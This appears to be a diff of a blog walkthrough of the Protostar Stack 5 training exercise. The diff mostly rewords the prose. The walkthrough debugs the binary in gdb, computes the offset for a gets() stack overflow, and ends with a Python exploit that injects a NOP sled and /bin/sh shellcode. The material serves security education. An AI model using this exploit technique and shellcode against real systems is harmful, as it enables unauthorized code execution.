@@ -4,6 +4,7 @@ title: Protostar - Stack 5
 description: >
   Walkthrough of a simple binary explotation
 image: /assets/img/posts/protostar5.png
+categories: [BinaryExplotation, stack overflow]
 ---
 # Protostar - Stack 5
 
@@ -38,10 +39,10 @@ Some interesting facts about the file are:
 ```
 
 2. The file is an `ELF 32-bit LSB executable, Intel 80386`. Elf is the file format, 32-bit is the word size, LSB means that least significant bytes first (Little endian) and Intel 80386 (x86) is the instruction set used.
-3. The file has symbols, as indicated by the `not stripped` attribute. This is particularly helpful as we can see the original variables and function names during the debug/analysis process.
-4. The file uses shared libraries, as it is dynamically linked. This means that it uses existing libraries in our system as part of its execution. This is helpful as it helps to identify common libraries used in the binary.
+3. The file has symbols, as indicated by the `not stripped` attribute. This is particularly helpful as it is possible to see the original variables and function names during the debug/analysis process.
+4. The file uses shared libraries, as it is dynamically linked. It uses existing libraries in the system as part of its execution. This helps to identify standard functions used in the binary.
 
-By checking the program headers of our binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim's machine):
+By checking the headers of the binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim's machine):
 ```bash
 $ readelf -l stack5
 ...
@@ -87,7 +88,7 @@ Breakpoint 6, main (argc=1, argv=0xbffff854) at stack5/stack5.c:10
 (gdb) 
 ```
 
-By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show only the base pointer (EBP) pushed into the stack but nothing else.
+By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show the base pointer (EBP) pushed into the stack but nothing else.
 
 ```bash
 user@protostar:/opt/protostar/bin$ objdump -dj .text stack5 | grep -A10 "<main>:"
@@ -95,8 +96,8 @@ user@protostar:/opt/protostar/bin$ objdump -dj .text stack5 | grep -A10 "<main>:
  80483c4:	55                   	push   %ebp
  80483c5:	89 e5                	mov    %esp,%ebp
  
- ; A stack protected binary would have some stack guards here
- ; that would like something like this:
+ ; A stack protected binary would have some stack guards here,
+ ; it would like something like this:
  ;mov    %fs:0x28,%rax     <- get guard variable value
  ;mov    %rax,-0x8(%rbp)   <- save guard variable on stack
  
@@ -121,7 +122,7 @@ user@protostar:/opt/protostar/bin$ objdump -dj .text stack5 | grep -A10 "<main>:
 
 ### Analyze symbols
 
-We will list the functions available since symbols are not stripped.
+GDB will be used to list the functions available since symbols are not stripped.
 
 ```bash
 (gdb) info functions
@@ -147,7 +148,7 @@ Non-debugging symbols:
 0x08048450  __do_global_ctors_aux
 0x0804847c  _fini
 ```
-We also executed the next objdump command (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):
+`objdump` command can be used as well for the same purpose (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):
 
 ```bash
 $objdump -M intel -TC stack4
@@ -162,9 +163,9 @@ DYNAMIC SYMBOL TABLE:
 
 ### Analyze binary flow
 
-It seems that there is not much going on in the binary. Not many functions except from `gets`, `puts` and `main`. Let's explore the main function to see the flow of the program.
+It seems that there is not much going on in the binary. Not many functions except from `gets`, `puts` and `main`. Next step is to explore the `main` function to see the flow of the program.
 
-Let's run the program and break on the main function.
+The program was run through GDB and a break point was set on the main function.
 
 ```bash
 $ gdb stack5
@@ -178,7 +179,7 @@ Breakpoint 1, main (argc=1, argv=0xbffff854) at stack5/stack5.c:10
 	in stack5/stack5.c
 ```
 
-Let's disassemble main, to see the flow of the program. First, we loaded the binary in gdb and set a breakpoint in the main function to disassemble it.
+Through GDB, the `main` function will be disassembled, this is done to see the flow of the program. 
 
 ```bash
 (gdb) set disassembly-flavor intel
@@ -196,8 +197,10 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Let's breakdown what is going on in the main function:
+An instruction per instruction breakdown of the `main` function is done to understand the flow of the program: 
+
 1. The first four instructions correspond to the prologue of the function:
+
 ```bash
 push   ebp               ; This saves the previous base pointer to the stack
 mov    ebp,esp           ; This sets the current base point to the current stack pointer value
@@ -215,9 +218,9 @@ call   0x80482e8 <gets@plt>  ; Calls the gets function.
 ```
 <em>* Calling convention for x86 executables is to put the arguments to a function in the top of the stack before the doing call.</em>
 
-From this we can appreciate that we are passing a pointer to SP + 0x10 as the argument to the `gets` function.
+From the previous figure it is possible to appreciate that `main` is passing a pointer of value SP + 0x10 as the argument to the `gets` function.
 
-We know that GLIBC_2.0 `gets` has the following definition, which is inline to what we see in the disassembly:
+Manpages states that GLIBC_2.0 `gets` has the following definition, which is inline to what is observed in the disassembly:
 ```c
 char *gets(char *str)
 ```
@@ -230,14 +233,15 @@ char *gets(char *str)
 
 ### Identify the vulnerability
 
-In this case we know that `gets` is an inherently unsafe function. `gets` is supposed to read from stdin and copy the input into a buffer. The basic problem is that `gets` doesn't know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it. 
+`gets` is an inherently unsafe function. `gets` is supposed to read from stdin and copy the input into a buffer. The basic problem is that `gets` doesn't know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it. 
 
-From the disassembly we know that the buffer pointer we are passing is from the stack:
+From the disassembly it is possible to see that the buffer address being passed points to a section in the stack:
+
 ```bash
 sub    esp,0x50          ; Allocates 0x50 bytes from the stack
 lea    eax,[esp+0x10]    ; *Gives a pointer that is at offset 0x10 from the top of our stack
 ```
-<em>*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards.</em>
+<em>*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards. This is known through the architecture and system the binary is targeted towards.</em>
 
 A stack frame represents a function call in a regular program. A normal stack frame (this can vary depending on architecture) looks like the following:
 ```
@@ -275,9 +279,9 @@ A stack frame gets created through the following steps:
 4. Store the current stack pointer (ESP) into the base pointer (EBP), since this is the start of the new stack frame.
 5. Allocate the local variables' memory.
 
-In our case #1 and #2 are depicted in a single instruction which is `call`. 
+In this case #1 and #2 are depicted in a single instruction which is `call`. 
 
-To illustrate this, let's single-step through the `gets` function call:
+To illustrate this, GDB will be used to single-step through the `gets` function call:
 
 ```bash
 (gdb) si
@@ -323,7 +327,7 @@ gs             0x33	51
 
 ```
 
-As we can see above we are about to execute instruction `0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>` our instruction pointer EIP also shows this as it has `0x80483d4` as value. Let see what happens when we go into the function.
+As observed above the program is about to execute instruction `0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>` the instruction pointer (EIP) also shows this as it has `0x80483d4` as value. Proceding with the program execution, `si` is used to step into `gets` function call.
 
 ```bash
 (gdb) si
@@ -356,11 +360,11 @@ gs             0x33	51
 
 ```
 
-By executing *call*, the program did two things, (#1) it jumped into the `gets` function as showed by our instruction pointer EIP and (#2) it pushed `0x080483d9` to our stack as well (which corresponds to `0x080483d9 <main+21>:    leave `). 
+By executing *call*, the program did two things, (#1) it jumped into the `gets` function as showed by the instruction pointer EIP and (#2) it pushed `0x080483d9` to the stack as well (which corresponds to `0x080483d9 <main+21>:    leave `). 
 
-Let's continue stepping in:
+Proceding with the execution:
 
-Since we are calling into a dynamic library there will be some extra steps happening (loading the library and doing a lookup of the actual address of `gets`), but finally we arrive into the `gets` function which points to the`_IO_gets` in the GLIBC_2.0 library:
+Since the program calls into a dynamic library there will be some additional steps happening (loading the library and doing a lookup of the actual address of `gets`), but finally the execution arrives into the `gets` function which points to the`_IO_gets` in the GLIBC_2.0 library:
 
 ```bash
 (gdb) si
@@ -381,9 +385,9 @@ Dump of assembler code for function _IO_gets:
 ```
 
 
-As we enter the `gets` function the program will (#3) push the base pointer of the current stack frame (main's stack frame) into the stack, (#4) setting te current stack pointer as the base pointer and (#5) it will allocate 0x24 bytes in the stack.
+As the execution enters the `gets` function the program will (#3) push the base pointer of the current stack frame (`main`'s stack frame) into the stack, (#4) will set the current stack pointer as the base pointer and (#5) will allocate 0x24 bytes in the stack.
 
-As we can see in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are `main`'s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or `<main+21>:    leave `.
+As is seen in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are `main`'s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or `<main+21>:    leave `.
 
 Based on our stack representation, we have the following:
 
@@ -420,9 +424,9 @@ Based on our stack representation, we have the following:
 +--------------------+ 0xFFFFFFFF
 ```
 
-Based on the previous statements, we can exploit `gets` vulnerability to overwrite `main`'s return pointer and hijack the execution towards an address that we desire. 
+Based on the previous statements, it is possible to exploit `gets` vulnerability to overwrite `main`'s return pointer and hijack the execution towards an address that is desired. 
 
-We know that the buffer passed to `gets` resides in 0xbffff750 + 0x10 (Remember `main` dissasemble):
+Based on the previous information, it is known that the buffer passed to `gets` resides in 0xbffff750 + 0x10 (Based on `main`'s dissasemble):
 
 ```bash
 (gdb) si
@@ -436,7 +440,7 @@ Dump of assembler code for function main:
 0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
 
 (gdb) x $esp
-0xbffff750:	0xb7fd7ff4 ; We care about the address not the value
+0xbffff750:	0xb7fd7ff4 ; Focus on the address
 ```
 
 The stack would look something like this:
@@ -509,21 +513,21 @@ frame        |  +--------------------+ <------+ Main's Return Pointer (0xbffff7a
                 +--------------------+ 0xFFFFFFFF
 ```
 
-We know `mains`'s EBP is 0xbffff7a8 (from the `gets`' stack frame. A register in a 32bit architecture corresponds to 4 bytes. So `main`s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer. The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address `gets` would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).
+`mains`'s EBP is 0xbffff7a8 (information extracted from the `gets`' stack frame). A register in a 32bit architecture corresponds to 4 bytes. So `main`s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer (`mains`'s EIP before `gets` was called). The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address `gets` would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).
 
 ### Exploitation
 
 #### Taking control of execution
 
-Based on the previous section, it is known that to overwrite `main`'s return pointer `gets` needs to read 80 bytes. This to overflow the local variable section, ebp section, and return pointer section of `main`'s stack frame.
+Based on the previous section, it is known that to overwrite `main`'s return pointer `gets` needs to read 80 bytes from stdin. This to overflow the local variable section, ebp section, and return pointer section of `main`'s stack frame.
 
-To achieve that we need to pass a payload similar to this:
+To achieve it a payload similar to this will be sent:
 
 ```
 76 bytes + return address
 ```
 
-In order to do that, we can use the following python script. For now, the instruction pointer (return address) was set to 0x45454545:
+In order to do it, a python script will be used. For now, the instruction pointer (return address) was set to 0x45454545 to illustrate the hijacking of the return address:
 
 ```python
 import struct
@@ -541,7 +545,7 @@ user@protostar:~$ cat in.txt
 ����������������������������������������������������������������������������EEEE
 ```
 
-Let's use the *in.txt* as input to our program in GDB:
+*in.txt* was used as input to our program in GDB:
 
 ```bash
 (gdb) b main
@@ -549,7 +553,7 @@ Breakpoint 6 at 0x80483cd: file stack5/stack5.c, line 10.
 (gdb) r < ~/in.txt
 ```
 
-A breakpoint in main was set so we can analyze how the stack is modified by the provided input. By analyzing the stack after the `gets` function was executed we can see the following:
+A breakpoint in main was set so to analyze how the stack is modified by the provided input. By analyzing the stack after the `gets` function was executed the following can be observed:
 
 ```bash
 (gdb) info registers
@@ -586,9 +590,9 @@ End of assembler dump.
 
 ```
 
-From above it is possible to observe that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack. 
+In the previous figure it is observed that the return pointer was overwritten successfully with the value we provided (0x45454545). In Analyze File section it was stated that this binary allows execution from stack as it has NX feature disabled. This means that it is possible to execute written from the stack. 
 
-Payload will be updated to accommodate instructions to be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:
+Input passed to the program will be updated to accommodate instructions the will be executed by redirecting the return pointer to that memory in the stack. This is illustrated in the following diagram:
 
 ```
                                +--------------------+ 0x00000000
@@ -638,7 +642,7 @@ instructions = '\xCC' * 4
 print(padding + returnPointer + instructions)
 ```
 
-By passing this input to gdb, and analyzing the stack just before ret gets called, it is possible to observe how the stack was changed:
+By passing this input to gdb, and analyzing the stack just before `ret` gets called, it is possible to observe how the stack was changed:
 
 ```bash
 (gdb) r < ~/in.txt
@@ -670,9 +674,9 @@ End of assembler dump.
 (gdb) 
 ```
 
-`main`'s return pointer is overwritten to 0xbffff7b0, this means that when the ret instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (`int3`) instruction.
+`main`'s return pointer is overwritten to 0xbffff7b0, this means that when the `ret` instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (`int3`) instruction.
 
-By continuing execution in GDB, we can observe that the injected payload was executed and that the breakpoint trap was surfaced to GDB.
+By continuing execution in GDB, it is observed that the injected payload was executed and that the breakpoint trap was surfaced to GDB.
 
 ```bash
 (gdb) c
@@ -772,20 +776,20 @@ Therefore, it is preferable to "slide" the execution to the target address inste
 
 #### NOP-Sled
 
-A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, as if we miss and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.
+A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, in case the hijacked return pointer misses and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.
 
 #### Weaponization
-To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on [Andres C. Rodriguez ](http://shell-storm.org/shellcode/files/shellcode-906.php)'s concept will be injected at the end of our payload. The Python script used to abuse the buffer overflow with a shellcode injection is:
+To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on [Andres C. Rodriguez ](http://shell-storm.org/shellcode/files/shellcode-906.php)'s concept will be injected at the end of the payload. The Python script used to abuse the buffer overflow with a shellcode injection is:
 
 ```python
 import struct
 
 padding = '\xAA' * 76
 returnPointer = struct.pack("I", 0xbffff7c0)
-nop_sled = "\x90" * 50
+nopSled = "\x90" * 50
 payload = "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 
-print(padding + returnPointer + nop_sled + payload)
+print(padding + returnPointer + nopSled + payload)
 ```
 
 **Note:** The return pointer can be any value that lands in the NOP sled.
